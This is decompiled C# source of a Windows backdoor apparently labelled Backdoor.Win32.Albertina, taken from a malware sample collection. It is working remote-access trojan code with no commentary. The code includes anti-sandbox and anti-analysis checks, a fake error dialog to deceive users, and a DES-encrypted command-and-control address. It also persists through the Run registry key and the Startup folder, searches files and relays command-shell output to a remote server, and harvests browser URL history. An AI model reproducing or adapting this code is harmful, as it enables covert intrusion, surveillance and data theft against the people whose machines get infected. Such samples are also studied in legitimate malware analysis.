// Decompiled with JetBrains decompiler
// Type: MainFrm
// Assembly: system64, Version=1.7.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3A793DDC-251A-4171-9485-CC449337E9FB
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.Albertina.a-2659e9cf20332bbe600ae977d69ecbc8d7bb0296e3865c38923fd4399b1e6a63.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using My;
using PrintText;
using ServiceControllerExtended;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[DesignerGenerated]
public class MainFrm : Form
{
  private static List<WeakReference> __ENCList = new List<WeakReference>();
  private IContainer components;
  [AccessedThroughProperty("ServiceController1")]
  private ServiceController _ServiceController1;
  private bool searchflag;
  private bool deskflag;
  private int restart;
  private int oldms;
  private int oldms2;
  private int mehand;
  private string clip;
  private string webflag;
  private string webflag2;
  private string webflag3;
  private string[] adrm;
  private string adr;
  private string adr2;
  private string sand;
  private int port;
  private int port2;
  private TcpClient tcpClient;
  private NetworkStream networkStream;
  private StreamWriter streamWriter;
  private StreamReader streamReader;
  private Process processCmd;
  private StringBuilder strInput;
  private int ChunkSize;
  private long _FileSize;
  private short _Index;
  private byte[] _Buffer;
  private FileStream _InputFileStram;
  private FileStream _OutputFileStram;
  private BinaryWriter _BinaryWriter;
  private BinaryReader _BinaryReader;
  private int _Fragments;
  private long _RemainingBytes;
  private long _StartPosition;
  private string _Mergedfile;
  private MessageBoxIcon iconmsg;
  private MessageBoxButtons btnmsg;
  private string msgtxt;
  private string titletxt;
  private Thread t;
  private string os;
  private Point mp;
  private const int SC_SCREENSAVE = 61760;
  private const int HWND_BROADCAST = 65535;
  private const int WM_SYSCOMMAND = 274;
  public const long M = 1;
  public const long MONITOR_ON = -1;
  public const int MONITOR_OFF = 2;
  private const int SC_MONITORPOWER = 61808;
  private const short WM_CAP = 1024;
  private const int WM_CAP_COPY = 1054;
  private const int WM_CAP_DRIVER_CONNECT = 1034;
  private const int WM_CAP_DRIVER_DISCONNECT = 1035;
  private const int WM_CAP_EDIT_COPY = 1054;
  private const int WM_CAP_GET_FRAME = 1084;
  private int hHwnd;
  private IDataObject tempObj;
  private Image tempImg;
  private ManagementObjectSearcher objCS;
  private string m_strManufacturer;
  private string m_StrModel;
  private string m_strWindowsDir;
  private const int MOUSEEVENTF_ABSOLUTE = 32768;
  private const int MOUSEEVENTF_LEFTDOWN = 2;
  private const int MOUSEEVENTF_LEFTUP = 4;
  private const int MOUSEEVENTF_MOVE = 1;
  private const int MOUSEEVENTF_MIDDLEDOWN = 32;
  private const int MOUSEEVENTF_MIDDLEUP = 64;
  private const int MOUSEEVENTF_RIGHTDOWN = 8;
  private const int MOUSEEVENTF_RIGHTUP = 16;
  private string[] directoryList;
  private string[] fileArray;
  private string[] fileparts;
  private Thread MyThread;
  private string rt;
  private string[] orientationNames;
  private int[] orientationValues;
  private const long MB_DEFBUTTON1 = 0;
  private const long MB_DEFBUTTON2 = 256;
  private string[] sExes;
  private string[] sUsers;
  private string[] sModules;
  private string webflag4;
  private bool webflag5;
  private bool webflag6;

  [DebuggerNonUserCode]
  static MainFrm()
  {
  }

  public MainFrm()
  {
    this.FormClosing += new FormClosingEventHandler(this.MainFrm_FormClosing);
    this.Shown += new EventHandler(this.Form1_Shown);
    MainFrm.__ENCAddToList((object) this);
    this.restart = 0;
    this.ChunkSize = 4096;
    this._Buffer = new byte[0];
    this.os = Conversions.ToString(Environment.OSVersion.Version.Major);
    this.rt = "";
    this.orientationNames = new string[4]
    {
      "Default",
      "90",
      "180",
      "270"
    };
    this.orientationValues = new int[4]{ 0, 1, 2, 3 };
    this.sExes = new string[6]
    {
      "joeboxserver.exe",
      "joeboxcontrol.exe",
      "wireshark.exe",
      "avp.exe",
      "sniff_hit.exe",
      "sysAnalyzer.exe"
    };
    this.sUsers = new string[3]
    {
      "username",
      "user",
      "currentuser"
    };
    this.sModules = new string[4]
    {
      "api_log.dll",
      "dir_watch.dll",
      "pstorec.dll",
      "SbieDll.dll"
    };
    this.webflag5 = false;
    this.webflag6 = false;
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  private static void __ENCAddToList(object value)
  {
    lock (MainFrm.__ENCList)
    {
      if (MainFrm.__ENCList.Count == MainFrm.__ENCList.Capacity)
      {
        int index1 = 0;
        int num = checked (MainFrm.__ENCList.Count - 1);
        int index2 = 0;
        while (index2 <= num)
        {
          if (MainFrm.__ENCList[index2].IsAlive)
          {
            if (index2 != index1)
              MainFrm.__ENCList[index1] = MainFrm.__ENCList[index2];
            checked { ++index1; }
          }
          checked { ++index2; }
        }
        MainFrm.__ENCList.RemoveRange(index1, checked (MainFrm.__ENCList.Count - index1));
        MainFrm.__ENCList.Capacity = MainFrm.__ENCList.Count;
      }
      MainFrm.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
    }
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.components == null)
        return;
      this.components.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (MainFrm));
    this.ServiceController1 = new ServiceController();
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(0, 0);
    this.ControlBox = false;
    this.FormBorderStyle = FormBorderStyle.None;
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Margin = new Padding(18, 39, 18, 39);
    this.MaximizeBox = false;
    this.MinimizeBox = false;
    this.Name = nameof (MainFrm);
    this.Opacity = 0.0;
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.WindowState = FormWindowState.Minimized;
    this.ResumeLayout(false);
  }

  internal virtual ServiceController ServiceController1
  {
    [DebuggerNonUserCode] get => this._ServiceController1;
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ServiceController1 = value;
  }

  [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int SetWindowPos(
    int hwnd,
    int hWndInsertAfter,
    int x,
    int y,
    int cx,
    int cy,
    int wFlags);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern bool DestroyWindow(int hndw);

  [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int capCreateCaptureWindowA(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName,
    int dwStyle,
    int x,
    int y,
    int nWidth,
    short nHeight,
    int hWndParent,
    int nID);

  [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern bool capGetDriverDescriptionA(
    short wDriver,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
    int cbName,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
    int cbVer);

  [DllImport("winmm.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int mciExecute([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand);

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr FindWindowEx(
    IntPtr hwnd,
    IntPtr hWndChild,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszClassName,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindow);

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern bool IsWindowVisible(IntPtr hwnd);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern void mouse_event(
    int dwFlags,
    int dx,
    int dy,
    int cButtons,
    int dwExtraInfo);

  private string Manufacturer => this.m_strManufacturer;

  private string Model => this.m_StrModel;

  private string WindowsDirectory => this.m_strWindowsDir;

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern long SwapMouseButton(long bSwap);

  [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern long GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpModuleName);

  private bool ProcessCheck()
  {
    bool flag;
    try
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        object Left = (object) (processes[index].ProcessName + ".exe");
        if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.OrObject(Operators.CompareObjectEqual(Left, this.sExes.GetValue(0), false), Operators.CompareObjectEqual(Left, this.sExes.GetValue(1), false)), Operators.CompareObjectEqual(Left, this.sExes.GetValue(2), false)), Operators.CompareObjectEqual(Left, this.sExes.GetValue(3), false)), Operators.CompareObjectEqual(Left, this.sExes.GetValue(4), false)), Operators.CompareObjectEqual(Left, this.sExes.GetValue(5), false))))
        {
          flag = true;
          goto label_8;
        }
        else
          checked { ++index; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
label_8:
    return flag;
  }

  private bool ModuleCheck()
  {
    bool flag;
    try
    {
      int num = checked (this.sModules.Length - 1);
      int index = 0;
      while (index <= num)
      {
        string lpModuleName = Conversions.ToString(this.sModules.GetValue(index));
        if (MainFrm.GetModuleHandle(ref lpModuleName) != 0L)
        {
          flag = true;
          goto label_8;
        }
        else
          checked { ++index; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
label_8:
    return flag;
  }

  private bool UserCheck()
  {
    bool flag;
    try
    {
      int num = checked (this.sUsers.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.ConditionalCompareObjectEqual((object) Interaction.Environ("username"), this.sUsers.GetValue(index), false))
        {
          flag = true;
          goto label_8;
        }
        else
          checked { ++index; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
label_8:
    return flag;
  }

  private bool AntiSandbox()
  {
    bool flag;
    try
    {
      flag = this.UserCheck() || this.ProcessCheck() || Application.ExecutablePath.Contains("file.exe") || Application.ExecutablePath.Contains("Sample.exe") | Operators.CompareString(Interaction.Environ("username"), "andy", false) == 0 | Operators.CompareString(Interaction.Environ("username"), "Andy", false) == 0 || this.ModuleCheck() || Operators.CompareString(Application.StartupPath, "C:\\", false) == 0 | Operators.CompareString(Application.StartupPath, "D:\\", false) == 0 | Operators.CompareString(Application.StartupPath, "F:\\", false) == 0 | Operators.CompareString(Application.StartupPath, "X:\\", false) == 0 & Operators.CompareString(Interaction.Environ("username"), "Schmidti", false) == 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  private void SearchDirectory(string currentDirectory)
  {
    try
    {
      if (!this.searchflag)
        return;
      this.directoryList = Directory.GetDirectories(currentDirectory);
      this.fileArray = Directory.GetFiles(currentDirectory);
      string[] fileArray = this.fileArray;
      int index1 = 0;
      while (index1 < fileArray.Length)
      {
        string file = fileArray[index1];
        if (this.fileparts[1].StartsWith("*"))
        {
          string[] strArray = this.fileparts[1].Split('.');
          if (file.EndsWith(strArray[checked (strArray.Length - 1)]))
          {
            this.streamWriter.WriteLine("/SEARCHFL/" + file + "¦" + Conversions.ToString(MyProject.Computer.FileSystem.GetFileInfo(file).Length));
            this.streamWriter.Flush();
          }
        }
        else
        {
          string[] strArray = file.Split('\\');
          if (strArray[checked (strArray.Length - 1)].Contains(this.fileparts[1]))
          {
            this.streamWriter.WriteLine("/SEARCHFL/" + file + "¦" + Conversions.ToString(MyProject.Computer.FileSystem.GetFileInfo(file).Length));
            this.streamWriter.Flush();
          }
        }
        checked { ++index1; }
      }
      string[] directoryList = this.directoryList;
      int index2 = 0;
      while (index2 < directoryList.Length)
      {
        string currentDirectory1 = directoryList[index2];
        if (!(currentDirectory1.Substring(3).StartsWith("WINDOWS") | currentDirectory1.Substring(3).StartsWith("WINNT")))
          this.SearchDirectory(currentDirectory1);
        checked { ++index2; }
      }
      this.directoryList = (string[]) null;
      if (currentDirectory.Length == 3)
      {
        this.streamWriter.WriteLine("/SEARCHFL/SEARCHEND");
        this.streamWriter.Flush();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private ImageCodecInfo GetEncoderInfo(string mimeType)
  {
    ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
    int length = imageEncoders.Length;
    int index = 0;
    while (index <= length)
    {
      if (Operators.CompareString(imageEncoders[index].MimeType, mimeType, false) == 0)
        return imageEncoders[index];
      checked { ++index; }
    }
    return (ImageCodecInfo) null;
  }

  private void MainFrm_FormClosing(object sender, FormClosingEventArgs e)
  {
    if (Conversions.ToDouble(this.os) < 6.0)
    {
      string executablePath = Application.ExecutablePath;
      string directory = MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\System";
      try
      {
        if (!MyProject.Computer.FileSystem.DirectoryExists(directory))
          MyProject.Computer.FileSystem.CreateDirectory(directory);
        try
        {
          string str = directory + "\\" + Path.GetFileName(executablePath);
          if (!System.IO.File.Exists(str))
            System.IO.File.Copy(executablePath, str, true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (!Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue("ARC"), (object) null, false))
          return;
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("ARC", (object) (directory + "\\" + Path.GetFileName(executablePath)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      try
      {
        string executablePath = Application.ExecutablePath;
        string destFileName = Environment.GetEnvironmentVariable("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + Path.GetFileName(executablePath);
        System.IO.File.Copy(executablePath, destFileName, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void Form1_Shown(object sender, EventArgs e)
  {
    try
    {
      this.Hide();
      try
      {
        this.adrm = this.adrr().Split('*');
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (this.adrm == null)
      {
        this.adr = "127.0.0.1";
        this.port = 71;
      }
      else
      {
        this.adr = this.adrm[0].ToString();
        this.adr2 = this.adrm[1].ToString();
        this.port = Operators.CompareString(this.adrm[2].ToString(), (string) null, false) != 0 ? int.Parse(this.adrm[2].ToString()) : 71;
        this.port2 = Operators.CompareString(this.adrm[3].ToString(), (string) null, false) != 0 ? int.Parse(this.adrm[3].ToString()) : 80;
        this.sand = Conversions.ToString(int.Parse(this.adrm[4].ToString()));
      }
      if (Operators.CompareString(this.adr, (string) null, false) == 0)
      {
        Application.Exit();
      }
      else
      {
        if (Conversions.ToDouble(this.sand) == 1.0 && this.AntiSandbox())
        {
          int num = (int) MessageBox.Show("The application failed to initialize properly (0xc000007b). Click Ok to terminate the application.", "Application Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          Application.Exit();
          return;
        }
        this.MyThread = new Thread(new ThreadStart(this.RunServer));
        this.MyThread.Start();
      }
      this.mehand = this.Handle.ToInt32();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Application.Exit();
      ProjectData.ClearProjectError();
    }
  }

  private string Encrypt(string strText, string strEncrKey)
  {
    byte[] rgbIV = new byte[8]
    {
      (byte) 18,
      (byte) 52,
      (byte) 86,
      (byte) 120,
      (byte) 144,
      (byte) 171,
      (byte) 205,
      (byte) 239
    };
    string str;
    try
    {
      byte[] bytes1 = Encoding.UTF8.GetBytes(Strings.Left(strEncrKey, 8));
      byte[] bytes2 = Encoding.UTF8.GetBytes(strText);
      DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateEncryptor(bytes1, rgbIV), CryptoStreamMode.Write);
      cryptoStream.Write(bytes2, 0, bytes2.Length);
      cryptoStream.FlushFinalBlock();
      str = Convert.ToBase64String(memoryStream.ToArray());
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  private string Decrypt(string strText, string sDecrKey)
  {
    string str;
    try
    {
      byte[] rgbIV = new byte[8]
      {
        (byte) 18,
        (byte) 52,
        (byte) 86,
        (byte) 120,
        (byte) 144,
        (byte) 171,
        (byte) 205,
        (byte) 239
      };
      byte[] numArray = new byte[checked (strText.Length + 1)];
      byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(sDecrKey, 8));
      DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
      byte[] buffer = Convert.FromBase64String(strText);
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
      cryptoStream.Write(buffer, 0, buffer.Length);
      cryptoStream.FlushFinalBlock();
      str = Encoding.UTF8.GetString(memoryStream.ToArray());
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  private string adrr()
  {
    string str;
    try
    {
      str = this.Decrypt(My.Resources.Resources.String1.Split('*')[0], "&%#@?,:*");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  private void StopStream()
  {
    try
    {
      this._InputFileStram.Close();
      this._BinaryReader.Close();
      this._BinaryWriter = (BinaryWriter) null;
      this._OutputFileStram = (FileStream) null;
      this._BinaryReader = (BinaryReader) null;
      this._InputFileStram = (FileStream) null;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void CloseWindows()
  {
    try
    {
      if (this.InvokeRequired)
      {
        this.Invoke((Delegate) new MainFrm.CloseWindow_Delegate(this.CloseWindows));
      }
      else
      {
        this.Close();
        Application.Exit();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public bool FileExists(ref string FileName)
  {
label_1:
    int num1;
    bool flag;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = -2;
label_2:
      int num3 = 2;
      flag = (Microsoft.VisualBasic.FileSystem.GetAttr(FileName) & FileAttribute.Directory) == FileAttribute.Normal;
      goto label_9;
label_4:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_2;
            case 3:
              goto label_9;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_4;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_9:
    int num5 = flag ? 1 : 0;
    if (num2 == 0)
      return num5 != 0;
    ProjectData.ClearProjectError();
    return num5 != 0;
  }

  private string Extract(ref string Temp)
  {
    string str1;
    try
    {
      string str2 = (string) null;
      int num1 = Strings.Len(Temp);
      int num2 = 1;
      while (num2 <= num1 && Operators.CompareString(Strings.Mid(Temp, num2, 1), "*", false) != 0)
      {
        str2 = Strings.Mid(Temp, 1, num2);
        checked { ++num2; }
      }
      str1 = str2;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str1 = (string) null;
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  private string ListProcess()
  {
    string str1;
    try
    {
      Process[] processes = Process.GetProcesses();
      string Left = (string) null;
      Process[] processArray = processes;
      int index = 0;
      while (index < processArray.Length)
      {
        Process process = processArray[index];
        string str2 = process.ProcessName + "*" + process.Id.ToString() + "*" + process.BasePriority.ToString() + "*" + process.WorkingSet64.ToString();
        Left = Operators.CompareString(Left, (string) null, false) != 0 ? Left + "$" + str2 : str2;
        checked { ++index; }
      }
      str1 = Left;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str1 = (string) null;
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  private string ListServices()
  {
    string str1;
    try
    {
      string Left = (string) null;
      ServiceController[] services = ServiceController.GetServices();
      int index = 0;
      while (index < services.Length)
      {
        ServiceController serviceController = services[index];
        string str2 = serviceController.DisplayName + "*" + serviceController.Status.ToString() + "*" + new ServiceControllerEx(serviceController.ServiceName).StartupType;
        Left = Operators.CompareString(Left, (string) null, false) != 0 ? Left + "$" + str2 : str2;
        checked { ++index; }
      }
      str1 = Left;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str1 = (string) null;
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  private string ListDriver()
  {
    string str1;
    try
    {
      string str2 = (string) null;
      string[] logicalDrives = Directory.GetLogicalDrives();
      int index = 0;
      while (index < logicalDrives.Length)
      {
        string str3 = logicalDrives[index];
        str2 = str2 + "*" + str3;
        checked { ++index; }
      }
      str1 = str2;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str1 = (string) null;
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  private void Delay(int DelayInSeconds)
  {
    DateTime dateTime = DateTime.Now.AddSeconds((double) DelayInSeconds);
    TimeSpan timeSpan;
    do
    {
      timeSpan = dateTime.Subtract(DateTime.Now);
      Application.DoEvents();
      Thread.Sleep(100);
    }
    while (timeSpan.TotalSeconds > 0.0);
  }

  private long FileSize(string FileName)
  {
    long length;
    try
    {
      length = new FileInfo(FileName).Length;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return length;
  }

  private void Showdesk()
  {
    try
    {
      string str1 = "ProgMan";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      IntPtr window = MainFrm.GetWindow(MainFrm.FindWindow(ref local1, ref local2), 5U);
      if (MainFrm.IsWindowVisible(window))
        return;
      MainFrm.ShowWindow(window, 4);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void Hidedesk()
  {
    try
    {
      string str1 = "ProgMan";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      IntPtr window = MainFrm.GetWindow(MainFrm.FindWindow(ref local1, ref local2), 5U);
      if (!MainFrm.IsWindowVisible(window))
        return;
      MainFrm.ShowWindow(window, 0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void showSbtn()
  {
    try
    {
      IntPtr zero1 = IntPtr.Zero;
      IntPtr zero2 = IntPtr.Zero;
      string str1 = "Shell_TrayWnd";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      IntPtr windowEx = MainFrm.FindWindowEx(zero1, zero2, ref local1, ref local2);
      IntPtr zero3 = IntPtr.Zero;
      string str3 = "BUTTON";
      ref string local3 = ref str3;
      string str4 = (string) null;
      ref string local4 = ref str4;
      MainFrm.ShowWindow(MainFrm.FindWindowEx(windowEx, zero3, ref local3, ref local4), 9);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void hideSbtn()
  {
    try
    {
      IntPtr zero1 = IntPtr.Zero;
      IntPtr zero2 = IntPtr.Zero;
      string str1 = "Shell_TrayWnd";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      IntPtr windowEx = MainFrm.FindWindowEx(zero1, zero2, ref local1, ref local2);
      IntPtr zero3 = IntPtr.Zero;
      string str3 = "BUTTON";
      ref string local3 = ref str3;
      string str4 = (string) null;
      ref string local4 = ref str4;
      MainFrm.ShowWindow(MainFrm.FindWindowEx(windowEx, zero3, ref local3, ref local4), 0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void hideT()
  {
    try
    {
      string str1 = "Shell_TrayWnd";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      MainFrm.ShowWindow((IntPtr) (long) MainFrm.FindWindow(ref local1, ref local2), 0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void showT()
  {
    try
    {
      string str1 = "Shell_TrayWnd";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      MainFrm.ShowWindow((IntPtr) (long) MainFrm.FindWindow(ref local1, ref local2), 9);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void Cleanup()
  {
    try
    {
      try
      {
        this.processCmd.Kill();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.streamReader.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.streamWriter.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.networkStream.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.tcpClient.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
  {
    try
    {
      StringBuilder stringBuilder = new StringBuilder();
      if (string.IsNullOrEmpty(outLine.Data))
        return;
      stringBuilder.Append("/CMDCMDGO/");
      stringBuilder.Append(outLine.Data);
      if (!(outLine.Data.StartsWith("Microsoft") | outLine.Data.StartsWith("(C)") | outLine.Data.StartsWith("Copyright")))
      {
        this.streamWriter.WriteLine((object) stringBuilder);
        this.streamWriter.Flush();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void MSG()
  {
    try
    {
      int num = (int) MessageBox.Show(this.msgtxt, this.titletxt, this.btnmsg, this.iconmsg);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private string PopulateUrlList()
  {
    string str1;
    try
    {
      string name1 = "Software\\Microsoft\\Internet Explorer\\TypedURLs";
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name1);
      string str2 = (string) null;
      int num = 1;
      while (true)
      {
        string name2 = "url" + num.ToString();
        string str3 = (string) registryKey.GetValue(name2);
        if (str3 != null)
        {
          str2 = str2 + "*" + str3;
          checked { ++num; }
        }
        else
          break;
      }
      str1 = str2;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str1 = (string) null;
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  [DllImport("winmm.dll")]
  private static extern void mciSendStringA(
    string lpstrCommand,
    string lpstrReturnString,
    int uReturnLength,
    int hwndCallback);

  private void EjectCD()
  {
    try
    {
      MainFrm.mciSendStringA("set CDAudio door open", this.rt, (int) sbyte.MaxValue, 0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void CloseCD()
  {
    try
    {
      MainFrm.mciSendStringA("set CDAudio door closed", this.rt, (int) sbyte.MaxValue, 0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private int GetSettings(ref DisplaySettingsSample.DEVMODE dm) => this.GetSettings(ref dm, -1);

  private int GetSettings(ref DisplaySettingsSample.DEVMODE dm, int iModeNum) => DisplaySettingsSample.NativeMethods.EnumDisplaySettings((string) null, iModeNum, ref dm);

